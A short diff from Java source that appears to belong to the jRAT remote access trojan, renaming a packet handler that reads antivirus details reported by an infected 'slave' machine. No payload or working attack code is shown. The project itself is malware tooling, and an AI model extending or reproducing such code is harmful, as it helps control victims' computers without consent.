@@ -5,7 +5,7 @@ import java.io.DataInputStream;
 import pro.jrat.Antivirus;
 import pro.jrat.Slave;
 
-public class Packet69Antivirus extends AbstractIncomingPacket {
+public class Packet69InitAntivirus extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
